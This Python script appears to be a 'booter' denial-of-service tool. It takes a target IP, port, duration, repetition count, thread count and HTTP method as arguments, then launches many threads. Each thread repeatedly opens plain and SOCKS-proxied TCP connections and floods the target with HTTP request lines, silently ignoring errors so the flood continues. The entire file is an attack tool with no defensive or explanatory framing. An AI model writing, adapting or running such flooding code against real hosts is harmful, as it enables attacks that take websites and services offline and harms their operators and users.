import socket,random,threading,sys,socks

def random_end(LENGTH):
   random_char = [random.choice(('\n','\r')) for _ in range(LENGTH)]
   return "".join(random_char)

def HTTP_PPS(ip,port,time,booters,methods):
    packet = [(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1),(socket.IPPROTO_TCP, socket.TCP_FASTOPEN, 1),(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1024),(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1024)]
    LENGTH = 1
    for _ in range(time):
        try:
         s = socket.socket(socket.AF_INET,socket.SOCK_STREAM, socket.IPPROTO_TCP)
         for p in packet:
          s.setsockopt(p[0],p[1],p[2])
         s.connect((ip, port))
         s.connect_ex((ip ,port))
         s2 = socket.create_connection((ip,port))
         s3 = socks.socksocket()
         for p in packet:
            s3.setsockopt(p[0],p[1],p[2])
         s3.connect((ip, port))
         s3.connect_ex((ip ,port))
         
         end = random_end(LENGTH)
         p = f'{methods} / HTTP/1.1{end}'

         for _ in range(booters):
               s.sendall(p.encode()); s.send(p.encode())
               s2.sendall(p.encode()); s2.send(p.encode())
               s3.sendall(p.encode()); s3.send(p.encode())
        except:pass
        LENGTH += 1

ip,methods = sys.argv[1],sys.argv[6]
port,time,booters,th = int(sys.argv[2]),int(sys.argv[3]),int(sys.argv[4]),int(sys.argv[5])
# IP PORT TIME BOOTER THREAD METHODS
for _ in range(th):
   threading.Thread(target=HTTP_PPS,args=(ip,port,time,booters,methods)).start()